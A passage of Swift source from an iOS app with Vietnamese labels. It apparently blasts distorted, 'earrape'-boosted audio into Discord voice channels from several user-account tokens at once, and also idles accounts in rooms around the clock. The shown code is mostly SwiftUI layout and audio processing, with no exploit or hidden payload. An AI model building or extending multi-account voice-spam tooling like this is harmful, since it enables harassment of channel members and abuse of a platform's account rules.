            var lpStateR: Float = 0
            var bassStateL: Float = 0
            var bassStateR: Float = 0
            var nextTickNanos = DispatchTime.now().uptimeNanoseconds

            while !Task.isCancelled {
                nextTickNanos &+= 20_000_000

                let snapshot = await MainActor.run { () -> (curIdx: Int, currentVol: Float, currentBoost: Float, bassAmt: Float, isClean: Bool, isMax: Bool, isPaused: Bool, currentFX: SpamAudioFX, currentSpeed: Float, decoder: AudioTrackDecoder?, readySessions: [VoiceGatewaySession]) in
                    return (
                        self.streamFrameIndex,
                        self.volume,
                        self.boostMultiplier,
                        self.bassAmount,
                        self.isCleanMode,
                        self.isMaxMode,
                        self.isPaused,
                        self.audioFX,
                        self.playbackSpeed,
                        self.currentDecoder,
                        self.activeSessions.filter { $0.isVoiceUDPReady }
                    )
                }

                if snapshot.isPaused {
                    try? await Task.sleep(nanoseconds: 20_000_000)
                    nextTickNanos = DispatchTime.now().uptimeNanoseconds
                    continue
                }

                guard let decoder = snapshot.decoder, !decoder.leftSamples.isEmpty else {
                    try? await Task.sleep(nanoseconds: 20_000_000)
                    nextTickNanos = DispatchTime.now().uptimeNanoseconds
                    continue
                }

                let leftSamples = decoder.leftSamples
                let rightSamples = decoder.rightSamples
                let totalSamples = leftSamples.count

                let startSample = snapshot.curIdx * 960
                let endSample = startSample + 960

                if endSample > totalSamples {
                    await MainActor.run {
                        self.playNext()
                    }
                    try? await Task.sleep(nanoseconds: 20_000_000)
                    nextTickNanos = DispatchTime.now().uptimeNanoseconds
                    continue
                }

                var chunkL = Array(leftSamples[startSample..<endSample])
                var chunkR = Array(rightSamples[startSample..<endSample])

                // 1. Lọc ồn chủ động (Highpass 150Hz + Lowpass 10kHz)
                if snapshot.isClean {
                    for i in 0..<960 {
                        hpStateL = 0.98 * (hpStateL + chunkL[i] - prevInL)
                        prevInL = chunkL[i]
                        chunkL[i] = hpStateL

                        hpStateR = 0.98 * (hpStateR + chunkR[i] - prevInR)
                        prevInR = chunkR[i]
                        chunkR[i] = hpStateR

                        lpStateL += 0.75 * (chunkL[i] - lpStateL)
                        chunkL[i] = lpStateL
                        lpStateR += 0.75 * (chunkR[i] - lpStateR)
                        chunkR[i] = lpStateR
                    }
                }

                // 2. Sát chiêu V9 Tối Thượng hoặc Trọng Lực Bass
                if snapshot.isMax {
                    for i in 0..<960 {
                        bassStateL += 0.35 * (chunkL[i] - bassStateL)
                        chunkL[i] = chunkL[i] + bassStateL * 2.2
                        bassStateR += 0.35 * (chunkR[i] - bassStateR)
                        chunkR[i] = chunkR[i] + bassStateR * 2.2

                        let biteL = chunkL[i] - bassStateL
                        chunkL[i] += biteL * 1.6
                        let biteR = chunkR[i] - bassStateR
                        chunkR[i] += biteR * 1.6

                        chunkL[i] = tanh(chunkL[i] * 2.5)
                        chunkR[i] = tanh(chunkR[i] * 2.5)
                    }
                } else if snapshot.bassAmt > 0 || snapshot.currentFX == .bassBoost {
                    let factor = (snapshot.bassAmt / 50.0) + (snapshot.currentFX == .bassBoost ? 1.0 : 0.0)
                    for i in 0..<960 {
                        bassStateL += 0.28 * (chunkL[i] - bassStateL)
                        chunkL[i] = max(-1.0, min(1.0, chunkL[i] + bassStateL * (1.2 * factor)))
                        bassStateR += 0.28 * (chunkR[i] - bassStateR)
                        chunkR[i] = max(-1.0, min(1.0, chunkR[i] + bassStateR * (1.2 * factor)))
                    }
                }

                // 3. Earrape FX
                if snapshot.currentFX == .earrape {
                    for i in 0..<960 {
                        chunkL[i] = tanh(chunkL[i] * 4.0)
                        chunkR[i] = tanh(chunkR[i] * 4.0)
                    }
                }

                // 4. Chân hỏa Volume & Ép xung Boost (Volume * Boost)
                let totalGain = snapshot.currentVol * snapshot.currentBoost
                if totalGain != 1.0 {
                    for i in 0..<960 {
                        chunkL[i] = tanh(chunkL[i] * totalGain)
                        chunkR[i] = tanh(chunkR[i] * totalGain)
                    }
                }

                // 5. Mã hóa Opus bằng lõi Xiph Opus thuần Rust và xả tới toàn bộ phân thân Đạo Hữu
                if let opus = encoder.encode(leftChannel: chunkL, rightChannel: chunkR) {
                    for s in snapshot.readySessions {
                        s.sendOpusPacket(opus)
                    }
                }

                // 6. Cập nhật tiến độ & visualizer
                var effSpeed = snapshot.currentSpeed
                if snapshot.currentFX == .nightcore { effSpeed = 1.25 }
                else if snapshot.currentFX == .slowed { effSpeed = 0.85 }

                speedAccumulator += effSpeed
                let advance = max(1, Int(speedAccumulator))
                speedAccumulator -= Float(advance)

                await MainActor.run {
                    self.streamFrameIndex += advance
                    if self.streamFrameIndex % 5 == 0 {
                        self.currentTime = Double(self.streamFrameIndex * 960) / 48000.0
                        self.visualizerLevels = (0..<8).map { _ in CGFloat.random(in: 0.2...0.95) }
                    }
                    if self.streamFrameIndex % 50 == 0 {
                        self.syncMusicNowPlaying()
                    }
                }

                let nowNanos = DispatchTime.now().uptimeNanoseconds
                if nextTickNanos > nowNanos {
                    try? await Task.sleep(nanoseconds: nextTickNanos - nowNanos)
                } else if nowNanos - nextTickNanos > 100_000_000 {
                    nextTickNanos = nowNanos
                }
            }
        }
    }

    nonisolated func audioPlayerDidFinishPlaying(_ player: AVAudioPlayer, successfully flag: Bool) {
        Task { @MainActor [weak self] in
            guard let self = self else { return }
            self.playNext()
        }
    }
}

// ==============================================================================
// MARK: - VOICE ROOM & XẢ MIC TAB VIEW (MODERN STUDIO CONTROL DECK)
// ==============================================================================
struct VoiceRoomTabView: View {
    @EnvironmentObject var app: AppState
    @EnvironmentObject var voiceRoom: VoiceRoomManager
    @EnvironmentObject var musicStream: MusicStreamManager

    @State private var mode: TabMode = .xaMic
    enum TabMode: String, CaseIterable, Identifiable {
        case xaMic = "Xả Nhạc VIP"
        case treoRoom = "Treo Room 24/7"
        var id: String { rawValue }
    }

    @State private var showGuildPicker = false
    @State private var showDocumentPicker = false
    @State private var showStreamMediaPicker = false
    @State private var showCamMediaPicker = false
    @State private var copiedMusicLog = false
    @State private var copiedRoomLog = false
    @State private var pulseLive = false

    private var accentStart: Color {
        mode == .xaMic ? Color(red: 0.95, green: 0.24, blue: 0.28) : Color(red: 0.36, green: 0.34, blue: 0.96)
    }

    private var accentEnd: Color {
        mode == .xaMic ? Color(red: 1.0, green: 0.50, blue: 0.14) : Color(red: 0.62, green: 0.28, blue: 0.95)
    }

    private var accentGradient: LinearGradient {
        LinearGradient(colors: [accentStart, accentEnd], startPoint: .topLeading, endPoint: .bottomTrailing)
    }

    private var isAnyBackgroundEngineActive: Bool {
        voiceRoom.isRunning || musicStream.isPlaying
    }

    var body: some View {
        NavigationStack {
            ZStack(alignment: .top) {
                Color(UIColor.systemGroupedBackground)
                    .ignoresSafeArea()

                LinearGradient(
                    colors: [accentStart.opacity(0.14), accentEnd.opacity(0.04), Color.clear],
                    startPoint: .top,
                    endPoint: .bottom
                )
                .frame(height: 240)
                .ignoresSafeArea(edges: .top)
                .animation(.easeInOut(duration: 0.35), value: mode)

                VStack(spacing: 0) {
                    studioTopBar
                    floatingModeSwitcher
                        .padding(.horizontal, 16)
                        .padding(.top, 6)
                        .padding(.bottom, 10)

                    ScrollView(showsIndicators: false) {
                        VStack(spacing: 16) {
                            if mode == .xaMic {
                                makeSuperVipSection
                            } else {
                                treoRoomSection
                            }
                        }
                        .padding(.horizontal, 16)
                        .padding(.top, 4)
                        .padding(.bottom, 96)
                    }
                }
            }
            .toolbar(.hidden, for: .navigationBar)
            .onAppear {
                pulseLive = true
            }
            .sheet(isPresented: $showGuildPicker) {
                VoiceGuildPickerSheet(isForSpam: mode == .xaMic)
            }
            .sheet(isPresented: $showDocumentPicker) {
                DocumentPicker(contentTypes: [.audio], allowsMultipleSelection: true) { _ in } onPickMultiple: { urls in
                    musicStream.addFiles(urls: urls)
                }
            }
            .sheet(isPresented: $showStreamMediaPicker) {
                DocumentPicker(contentTypes: [.movie, .video, .mpeg4Movie, .quickTimeMovie, .audio], allowsMultipleSelection: false) { url in
                    voiceRoom.pickMediaFile(url: url, forStream: true)
                }
            }
            .sheet(isPresented: $showCamMediaPicker) {
                DocumentPicker(contentTypes: [.movie, .video, .mpeg4Movie, .quickTimeMovie, .audio], allowsMultipleSelection: false) { url in
                    voiceRoom.pickMediaFile(url: url, forStream: false)
                }
            }
        }
    }

    // MARK: - MODERN STUDIO HEADER & FLOATING CAPSULE SWITCHER
    private var studioTopBar: some View {
        HStack(spacing: 12) {
            ZStack {
                RoundedRectangle(cornerRadius: 12, style: .continuous)
                    .fill(accentGradient)
                    .frame(width: 40, height: 40)
                    .shadow(color: accentStart.opacity(0.35), radius: 8, y: 4)
                Image(systemName: mode == .xaMic ? "flame.fill" : "waveform")
                    .font(.system(size: 18, weight: .bold))
                    .foregroundColor(.white)
            }

            VStack(alignment: .leading, spacing: 2) {
                Text(mode == .xaMic ? "Voice Studio • Xả Nhạc" : "Voice Studio • Treo Room")
                    .font(.system(size: 18, weight: .bold, design: .rounded))
                    .foregroundStyle(.primary)
                    .lineLimit(1)
                    .minimumScaleFactor(0.85)

                HStack(spacing: 6) {
                    if isAnyBackgroundEngineActive {
                        HStack(spacing: 4) {
                            Circle()
                                .fill(Color.green)
                                .frame(width: 6, height: 6)
                                .scaleEffect(pulseLive ? 1.25 : 0.85)
                                .animation(.easeInOut(duration: 1.0).repeatForever(autoreverses: true), value: pulseLive)
                            Text("24/7 CHẠY NỀN")
                                .font(.system(size: 10, weight: .heavy, design: .rounded))
                                .foregroundColor(.green)
                        }
                        .padding(.horizontal, 7)
                        .padding(.vertical, 2)
                        .background(Color.green.opacity(0.14))
                        .clipShape(Capsule())
                    } else {
                        Text("WebRTC • DAVE E2EE • 0% GPU Nền")
                            .font(.system(size: 11, weight: .medium))
                            .foregroundStyle(.secondary)
                            .lineLimit(1)
                    }
                }
            }

            Spacer(minLength: 6)

            Text(mode == .xaMic ? "SUPER VIP" : "24/7 PRO")
                .font(.system(size: 10, weight: .black, design: .rounded))
                .tracking(0.5)
                .foregroundColor(.white)
                .padding(.horizontal, 10)
                .padding(.vertical, 5)
                .background(accentGradient)
                .clipShape(Capsule())
                .shadow(color: accentStart.opacity(0.25), radius: 6, y: 2)
        }
        .padding(.horizontal, 16)
        .padding(.top, 10)
        .padding(.bottom, 6)
    }

    private var floatingModeSwitcher: some View {
        HStack(spacing: 6) {
            modePillButton(
                target: .xaMic,
                title: "Xả Nhạc VIP",
                icon: "flame.fill",
                isLive: musicStream.isPlaying,
                liveColor: musicStream.isPaused ? .orange : .green,
                colors: [Color(red: 0.95, green: 0.24, blue: 0.28), Color(red: 1.0, green: 0.50, blue: 0.14)]
            )
            modePillButton(
                target: .treoRoom,
                title: "Treo Room 24/7",
                icon: "waveform.circle.fill",
                isLive: voiceRoom.isRunning,
                liveColor: .green,
                colors: [Color(red: 0.36, green: 0.34, blue: 0.96), Color(red: 0.62, green: 0.28, blue: 0.95)]
            )
        }
        .padding(4)
        .background(Color(UIColor.secondarySystemGroupedBackground))
        .clipShape(Capsule())
        .overlay(
            Capsule().stroke(Color.primary.opacity(0.08), lineWidth: 1)
        )
        .shadow(color: Color.black.opacity(0.06), radius: 8, y: 3)
    }

    private func modePillButton(
        target: TabMode,
        title: String,
        icon: String,
        isLive: Bool,
        liveColor: Color,
        colors: [Color]
    ) -> some View {
        let selected = (mode == target)
        return Button {
            withAnimation(.spring(response: 0.32, dampingFraction: 0.78)) {
                mode = target
            }
        } label: {
            HStack(spacing: 6) {
                Image(systemName: icon)
                    .font(.system(size: 13, weight: .bold))
                Text(title)
                    .font(.system(size: 13, weight: .bold, design: .rounded))
                    .lineLimit(1)
                    .minimumScaleFactor(0.85)
                if isLive {
                    Circle()
                        .fill(selected ? Color.white : liveColor)
                        .frame(width: 7, height: 7)
                }
            }
            .foregroundColor(selected ? .white : .secondary)
            .frame(maxWidth: .infinity)
            .padding(.vertical, 10)
            .background(
                Group {
                    if selected {
                        LinearGradient(colors: colors, startPoint: .leading, endPoint: .trailing)
                    } else {
                        Color.clear
                    }
                }
            )
            .clipShape(Capsule())
            .shadow(color: selected ? colors[0].opacity(0.32) : .clear, radius: 6, y: 3)
        }
        .buttonStyle(.plain)
    }

    // MARK: - REUSABLE STUDIO UI PRIMITIVES
    private func studioCard<Content: View>(
        borderColor: Color = Color.primary.opacity(0.07),
        borderWidth: CGFloat = 1,
        @ViewBuilder content: () -> Content
    ) -> some View {
        VStack(alignment: .leading, spacing: 14) {
            content()
        }
        .padding(16)
        .frame(maxWidth: .infinity, alignment: .leading)
        .background(Color(UIColor.secondarySystemGroupedBackground))
        .clipShape(RoundedRectangle(cornerRadius: 20, style: .continuous))
        .overlay(
            RoundedRectangle(cornerRadius: 20, style: .continuous)
                .stroke(borderColor, lineWidth: borderWidth)
        )
        .shadow(color: Color.black.opacity(0.05), radius: 10, y: 4)
    }

    private func iconSquircle(systemName: String, colors: [Color], size: CGFloat = 34) -> some View {
        ZStack {
            RoundedRectangle(cornerRadius: size * 0.30, style: .continuous)
                .fill(LinearGradient(colors: colors, startPoint: .topLeading, endPoint: .bottomTrailing))
                .frame(width: size, height: size)
            Image(systemName: systemName)
                .font(.system(size: size * 0.45, weight: .bold))
                .foregroundColor(.white)
        }
    }

    private func microBadge(_ text: String, bg: Color, fg: Color = .white) -> some View {
        Text(text)
            .font(.system(size: 9, weight: .black, design: .rounded))
            .tracking(0.3)
            .padding(.horizontal, 7)
            .padding(.vertical, 3)
            .background(bg)
            .foregroundColor(fg)
            .clipShape(Capsule())
    }

    private func logLineColor(for message: String) -> Color {
        if message.contains("❌") || message.contains("Lỗi") || message.contains("lỗi") {
            return Color(red: 1.0, green: 0.45, blue: 0.45)
        }
        if message.contains("✅") || message.contains("🎬") || message.contains("sẵn sàng") {
            return Color(red: 0.36, green: 0.92, blue: 0.56)
        }
        if message.contains("⚠️") {
            return Color(red: 1.0, green: 0.78, blue: 0.32)
        }
        if message.contains("🌙") || message.contains("⚡") || message.contains("🔐") || message.contains("🌐") || message.contains("📺") {
            return Color(red: 0.46, green: 0.84, blue: 1.0)
        }
        return Color(white: 0.84)
    }

    private func studioTerminalCard(
        title: String,
        accent: Color,
        logs: [VoiceLogEntry],
        copied: Binding<Bool>,
        onClear: @escaping () -> Void
    ) -> some View {
        studioCard {
            HStack(spacing: 10) {
                iconSquircle(systemName: "terminal.fill", colors: [accent, accent.opacity(0.7)], size: 30)
                VStack(alignment: .leading, spacing: 1) {
                    Text(title)
                        .font(.system(size: 15, weight: .bold, design: .rounded))
                    Text("\(logs.count) dòng gần nhất")
                        .font(.caption2)
                        .foregroundStyle(.secondary)
                }
                Spacer()

                Button {
                    let dump = logs.map { "[\(formatTime($0.timestamp))] \($0.message)" }.joined(separator: "\n")
                    UIPasteboard.general.string = dump
                    copied.wrappedValue = true
                    DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
                        copied.wrappedValue = false
                    }
                } label: {
                    HStack(spacing: 4) {
                        Image(systemName: copied.wrappedValue ? "checkmark" : "doc.on.doc")
                        Text(copied.wrappedValue ? "Đã copy" : "Copy")
                    }
                    .font(.caption2.bold())
                    .padding(.horizontal, 9)
                    .padding(.vertical, 5)
                    .background(copied.wrappedValue ? Color.green.opacity(0.16) : Color(UIColor.tertiarySystemGroupedBackground))
                    .foregroundColor(copied.wrappedValue ? .green : .primary)
                    .clipShape(Capsule())
                }

                Button {
                    onClear()
                } label: {
                    Image(systemName: "trash")
                        .font(.caption.bold())
                        .padding(6)
                        .background(Color.red.opacity(0.12))
                        .foregroundColor(.red)
                        .clipShape(Circle())
                }
            }

            ScrollView {
                LazyVStack(alignment: .leading, spacing: 5) {
                    ForEach(logs) { log in
                        HStack(alignment: .top, spacing: 6) {
                            Text(formatTime(log.timestamp))
                                .font(.system(size: 10, weight: .semibold, design: .monospaced))
                                .foregroundColor(Color(white: 0.52))
                            Text(log.message)
                                .font(.system(size: 11, design: .monospaced))
                                .foregroundColor(logLineColor(for: log.message))
                                .fixedSize(horizontal: false, vertical: true)
                        }
                    }
                }
                .padding(10)
            }
            .frame(height: 145)
            .background(Color(red: 0.08, green: 0.09, blue: 0.13))
            .clipShape(RoundedRectangle(cornerRadius: 12, style: .continuous))
            .overlay(
                RoundedRectangle(cornerRadius: 12, style: .continuous)
                    .stroke(Color.white.opacity(0.08), lineWidth: 1)
            )
        }
    }

    // ==========================================================================
    // MARK: - TAB 1: XẢ NHẠC VIP (MODERN AUDIO DECK)
    // ==========================================================================
    private var makeSuperVipSection: some View {
        VStack(spacing: 16) {
            nowPlayingCard
            tokenAndChannelCard
            playlistQueueCard
            combatEffectsCard
            mainActionCard
            battleLogsCard
        }
    }

    // Card 1: Hero Now Playing Audio Deck
    private var nowPlayingCard: some View {
        let isLive = musicStream.isPlaying
        let readyCount = musicStream.activeSessions.filter { $0.isVoiceUDPReady }.count

        return studioCard(
            borderColor: isLive ? Color.red.opacity(0.35) : Color.primary.opacity(0.07),
            borderWidth: isLive ? 1.5 : 1
        ) {
            HStack(spacing: 8) {
                ZStack {
                    if isLive && !musicStream.isPaused {
                        Circle()
                            .fill(Color.red.opacity(0.28))
                            .frame(width: 18, height: 18)
                            .scaleEffect(pulseLive ? 1.25 : 0.8)
                            .animation(.easeInOut(duration: 0.9).repeatForever(autoreverses: true), value: pulseLive)
                    }
                    Circle()
                        .fill(isLive ? (musicStream.isPaused ? Color.orange : Color.red) : Color.secondary.opacity(0.5))
                        .frame(width: 9, height: 9)
                }

                Text(musicStream.statusText)
                    .font(.system(size: 13, weight: .bold, design: .rounded))
                    .foregroundStyle(isLive ? (musicStream.isPaused ? .orange : .red) : .secondary)
                    .lineLimit(1)

                Spacer()

                if isLive {
                    microBadge("⚡ \(readyCount) ĐẠO HỮU", bg: Color.red.opacity(0.16), fg: .red)
                } else {
                    microBadge("STANDBY", bg: Color(UIColor.tertiarySystemGroupedBackground), fg: .secondary)
                }
            }

            HStack(spacing: 14) {
                ZStack {
                    RoundedRectangle(cornerRadius: 14, style: .continuous)
                        .fill(
                            LinearGradient(
                                colors: isLive
                                    ? [Color(red: 0.95, green: 0.22, blue: 0.28), Color(red: 1.0, green: 0.50, blue: 0.14)]
                                    : [Color.red.opacity(0.18), Color.orange.opacity(0.12)],
                                startPoint: .topLeading,
                                endPoint: .bottomTrailing
                            )
                        )
                        .frame(width: 54, height: 54)

                    if isLive && !musicStream.isPaused {
                        HStack(alignment: .bottom, spacing: 3) {
                            ForEach(0..<4, id: \.self) { i in
                                let lvl = i < musicStream.visualizerLevels.count ? musicStream.visualizerLevels[i] : 0.4
                                Capsule()
                                    .fill(Color.white)
                                    .frame(width: 4, height: max(8, lvl * 28))
                                    .animation(.spring(response: 0.16, dampingFraction: 0.55), value: lvl)
                            }
                        }
                        .frame(height: 30)
                    } else {
                        Image(systemName: "music.note")
                            .font(.system(size: 22, weight: .bold))
                            .foregroundColor(isLive ? .white : .red)
                    }
                }

                VStack(alignment: .leading, spacing: 4) {
                    Text(musicStream.currentSongTitle)
                        .font(.system(size: 16, weight: .bold, design: .rounded))
                        .foregroundColor(.primary)
                        .lineLimit(1)

                    HStack(spacing: 6) {
                        microBadge(musicStream.audioFX.rawValue, bg: Color.red.opacity(0.12), fg: .red)
                        if musicStream.isMaxMode {
                            microBadge("V9 MAX", bg: Color.orange.opacity(0.18), fg: .orange)
                        }
                        if musicStream.isCleanMode {
                            microBadge("CLEAN", bg: Color.teal.opacity(0.18), fg: .teal)
                        }
                    }
                }

                Spacer(minLength: 0)
            }

            if isLive && !musicStream.isPaused {
                HStack(alignment: .bottom, spacing: 6) {
                    ForEach(0..<8, id: \.self) { i in
                        let lvl = i < musicStream.visualizerLevels.count ? musicStream.visualizerLevels[i] : 0.3
                        Capsule()
                            .fill(
                                LinearGradient(
                                    colors: [Color(red: 0.96, green: 0.24, blue: 0.30), Color.orange, Color.purple],
                                    startPoint: .bottom,
                                    endPoint: .top
                                )
                            )
                            .frame(maxWidth: .infinity)
                            .frame(height: max(8, lvl * 30))
                            .animation(.spring(response: 0.15, dampingFraction: 0.52), value: lvl)
                    }
                }
                .frame(height: 32)
                .padding(.horizontal, 12)
                .padding(.vertical, 8)
                .background(Color(UIColor.tertiarySystemGroupedBackground))
                .clipShape(RoundedRectangle(cornerRadius: 12, style: .continuous))
            }

            if musicStream.duration > 0 {
                VStack(spacing: 4) {
                    Slider(
                        value: Binding(
                            get: { musicStream.currentTime },
                            set: { val in musicStream.seek(to: val) }
                        ),
                        in: 0...max(musicStream.duration, 1.0)
                    )
                    .tint(.red)

                    HStack {
                        Text(formatSeconds(musicStream.currentTime))
                            .font(.system(size: 11, weight: .semibold, design: .monospaced))
                            .foregroundStyle(.secondary)
                        Spacer()
                        Text(formatSeconds(musicStream.duration))
                            .font(.system(size: 11, weight: .semibold, design: .monospaced))
                            .foregroundStyle(.secondary)
                    }
                }
            }

            HStack(spacing: 10) {
                Button {
                    musicStream.playPrevious()
                } label: {
                    Image(systemName: "backward.fill")
                        .font(.system(size: 14, weight: .bold))
                        .foregroundColor(.primary)
                        .frame(width: 38, height: 38)
                        .background(Color(UIColor.tertiarySystemGroupedBackground))
                        .clipShape(Circle())
                }
                .disabled(musicStream.playlist.isEmpty)
                .opacity(musicStream.playlist.isEmpty ? 0.45 : 1)

                if isLive {
                    Button {
                        if musicStream.isPaused {
                            musicStream.resumeSpam()
                        } else {
                            musicStream.pauseSpam()
                        }
                    } label: {
                        HStack(spacing: 6) {
                            Image(systemName: musicStream.isPaused ? "speaker.wave.3.fill" : "speaker.slash.fill")
                            Text(musicStream.isPaused ? "Sủa Tiếp" : "Câm Mồm")
                        }
                        .font(.system(size: 13, weight: .bold, design: .rounded))
                        .padding(.horizontal, 14)
                        .frame(height: 38)
                        .background(musicStream.isPaused ? Color.green.opacity(0.18) : Color.orange.opacity(0.18))
                        .foregroundColor(musicStream.isPaused ? .green : .orange)
                        .clipShape(Capsule())
                    }
                }

                Button {
                    musicStream.playNext()
                } label: {
                    Image(systemName: "forward.fill")
                        .font(.system(size: 14, weight: .bold))
                        .foregroundColor(.primary)
                        .frame(width: 38, height: 38)
                        .background(Color(UIColor.tertiarySystemGroupedBackground))
                        .clipShape(Circle())
                }
                .disabled(musicStream.playlist.isEmpty)
                .opacity(musicStream.playlist.isEmpty ? 0.45 : 1)

                Spacer()

                Button {
                    switch musicStream.loopMode {
                    case .loopAll: musicStream.loopMode = .loopOne
                    case .loopOne: musicStream.loopMode = .shuffle
                    case .shuffle: musicStream.loopMode = .loopAll
                    }
                } label: {
                    HStack(spacing: 5) {
                        Image(systemName: musicStream.loopMode.icon)
                            .font(.system(size: 12, weight: .bold))
                        Text(musicStream.loopMode.rawValue)
                            .font(.system(size: 11, weight: .bold, design: .rounded))
                            .lineLimit(1)
                    }
                    .padding(.horizontal, 11)
                    .frame(height: 34)
                    .background(Color.red.opacity(0.14))
                    .foregroundColor(.red)
                    .clipShape(Capsule())
                }
            }
        }
    }

    // Card 2: Trận Pháp Đạo Hữu & Kênh Xả
    private var tokenAndChannelCard: some View {
        studioCard {
            HStack(spacing: 10) {
                iconSquircle(systemName: "person.3.fill", colors: [Color.red, Color.orange])
                VStack(alignment: .leading, spacing: 1) {
                    Text("Trận Pháp & Kênh Xả")
                        .font(.system(size: 16, weight: .bold, design: .rounded))
                    Text(musicStream.multiTokenMode ? "Chạy đồng loạt \(activeTokens.count) token" : "Chạy đơn 1 token chỉ định")
                        .font(.caption)
                        .foregroundStyle(.secondary)
                }
                Spacer()
            }

            HStack(spacing: 8) {
                tactileOptionPill(
                    title: "Cả Dàn (\(activeTokens.count))",
                    icon: "person.3.fill",
                    isSelected: musicStream.multiTokenMode,
                    accent: .red
                ) {
                    withAnimation(.easeInOut(duration: 0.2)) { musicStream.multiTokenMode = true }
                }

                tactileOptionPill(
                    title: "1 Token",
                    icon: "person.fill",
                    isSelected: !musicStream.multiTokenMode,
                    accent: .red
                ) {
                    withAnimation(.easeInOut(duration: 0.2)) { musicStream.multiTokenMode = false }
                }
            }

            if !musicStream.multiTokenMode {
                HStack(spacing: 10) {
                    Text("Token xuất thủ")
                        .font(.subheadline.weight(.semibold))
                        .foregroundStyle(.secondary)
                    Spacer()
                    Menu {
                        ForEach(app.tokens) { t in
                            Button {
                                musicStream.selectedToken = t
                            } label: {
                                HStack {
                                    Text(t.username)
                                    if (musicStream.selectedToken?.id ?? app.activeToken?.id) == t.id {
                                        Image(systemName: "checkmark")
                                    }
                                }
                            }
                        }
                    } label: {
                        HStack(spacing: 6) {
                            let currentTok = musicStream.selectedToken ?? app.activeToken ?? app.tokens.first
                            if let t = currentTok {
                                if let url = t.avatarURL {
                                    AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                                    placeholder: { Circle().fill(.gray.opacity(0.4)) }
                                    .frame(width: 22, height: 22)
                                    .clipShape(Circle())
                                }
                                Text(t.username)
                                    .font(.subheadline.bold())
                                    .foregroundColor(.primary)
                                    .lineLimit(1)
                            } else {
                                Text("Chưa có token")
                                    .font(.subheadline)
                                    .foregroundStyle(.secondary)
                            }
                            Image(systemName: "chevron.up.chevron.down")
                                .font(.caption2.bold())
                                .foregroundStyle(.secondary)
                        }
                        .padding(.horizontal, 12)
                        .padding(.vertical, 8)
                        .background(Color(UIColor.tertiarySystemGroupedBackground))
                        .clipShape(Capsule())
                    }
                }
            }

            VStack(alignment: .leading, spacing: 8) {
                HStack(spacing: 8) {
                    HStack(spacing: 6) {
                        Image(systemName: "number")
                            .font(.caption.bold())
                            .foregroundStyle(.secondary)
                        TextField("Dán ID phòng Voice...", text: $musicStream.targetChannelId)
                            .textFieldStyle(.plain)
                            .font(.system(size: 14, design: .monospaced))
                            .keyboardType(.numberPad)
                        if !musicStream.targetChannelId.isEmpty {
                            Button {
                                musicStream.targetChannelId = ""
                            } label: {
                                Image(systemName: "xmark.circle.fill")
                                    .font(.caption)
                                    .foregroundStyle(.secondary)
                            }
                        }
                    }
                    .padding(.horizontal, 12)
                    .padding(.vertical, 10)
                    .background(Color(UIColor.tertiarySystemGroupedBackground))
                    .clipShape(RoundedRectangle(cornerRadius: 12, style: .continuous))

                    Button {
                        showGuildPicker = true
                    } label: {
                        HStack(spacing: 5) {
                            Image(systemName: "speaker.wave.2.fill")
                            Text("Chọn Kênh")
                        }
                        .font(.system(size: 13, weight: .bold, design: .rounded))
                        .foregroundColor(.white)
                        .padding(.horizontal, 14)
                        .padding(.vertical, 11)
                        .background(LinearGradient(colors: [.red, .orange], startPoint: .leading, endPoint: .trailing))
                        .clipShape(RoundedRectangle(cornerRadius: 12, style: .continuous))
                    }
                }

                if let g = musicStream.selectedGuild, let c = musicStream.selectedChannel {
                    HStack(spacing: 6) {
                        Image(systemName: "checkmark.circle.fill")
                            .foregroundColor(.green)
                            .font(.caption)
                        Text("\(g.name)  ›  \(c.displayName)")
                            .font(.caption.bold())
                            .foregroundColor(.green)
                            .lineLimit(1)
                        Spacer()
                    }
                    .padding(.horizontal, 10)
                    .padding(.vertical, 7)
                    .background(Color.green.opacity(0.12))
                    .clipShape(RoundedRectangle(cornerRadius: 10, style: .continuous))
                }
            }
        }
    }

    // Card 3: Hàng Đợi Nhạc (Playlist Queue)
    private var playlistQueueCard: some View {
        studioCard {
            HStack(spacing: 10) {
                iconSquircle(systemName: "music.note.list", colors: [Color.pink, Color.red])
                VStack(alignment: .leading, spacing: 1) {
                    Text("Danh Sách Nhạc")
                        .font(.system(size: 16, weight: .bold, design: .rounded))
                    Text("\(musicStream.playlist.count) bài trong hàng đợi")
                        .font(.caption)
                        .foregroundStyle(.secondary)
                }
                Spacer()

                Button {
                    showDocumentPicker = true
                } label: {
                    HStack(spacing: 5) {
                        Image(systemName: "folder.badge.plus")
                        Text("Nạp File")
                    }
                    .font(.caption.bold())
                    .foregroundColor(.white)
                    .padding(.horizontal, 12)
                    .padding(.vertical, 7)
                    .background(LinearGradient(colors: [.red, .orange], startPoint: .leading, endPoint: .trailing))
                    .clipShape(Capsule())
                }
            }

            HStack(spacing: 8) {
                Button {
                    musicStream.addAllPresets()
                } label: {
                    HStack(spacing: 5) {
                        Image(systemName: "star.fill").font(.caption2)
                        Text("Nạp Mẫu VIP").font(.caption.bold())
                    }
                    .padding(.horizontal, 11)
                    .padding(.vertical, 6)
                    .background(Color.orange.opacity(0.14))
                    .foregroundColor(.orange)
                    .clipShape(Capsule())
                }

                if !musicStream.playlist.isEmpty {
                    Button {
                        musicStream.clearPlaylist()
                    } label: {
                        HStack(spacing: 5) {
                            Image(systemName: "trash").font(.caption2)
                            Text("Xóa Hết").font(.caption.bold())
                        }
                        .padding(.horizontal, 11)
                        .padding(.vertical, 6)
                        .background(Color.red.opacity(0.12))
                        .foregroundColor(.red)
                        .clipShape(Capsule())
                    }
                }
                Spacer()
            }

            if musicStream.playlist.isEmpty {
                VStack(spacing: 8) {
                    Image(systemName: "music.note")
                        .font(.system(size: 28, weight: .semibold))
                        .foregroundStyle(.red.opacity(0.75))
                    Text("Hàng đợi nhạc đang trống")
                        .font(.subheadline.bold())
                    Text("Bấm \"Nạp File\" để chọn nhiều file .mp3, .m4a, .wav cùng lúc.")
                        .font(.caption)
                        .foregroundStyle(.secondary)
                        .multilineTextAlignment(.center)
                }
                .frame(maxWidth: .infinity)
                .padding(.vertical, 20)
                .padding(.horizontal, 12)
                .background(Color(UIColor.tertiarySystemGroupedBackground))
                .clipShape(RoundedRectangle(cornerRadius: 14, style: .continuous))
            } else {
                ScrollView {
                    LazyVStack(spacing: 8) {
                        ForEach(Array(musicStream.playlist.enumerated()), id: \.element.id) { index, item in
                            let isCurrent = (musicStream.currentTrackIndex == index)
                            Button {
                                musicStream.selectTrack(index: index)
                            } label: {
                                HStack(spacing: 10) {
                                    ZStack {
                                        RoundedRectangle(cornerRadius: 9, style: .continuous)
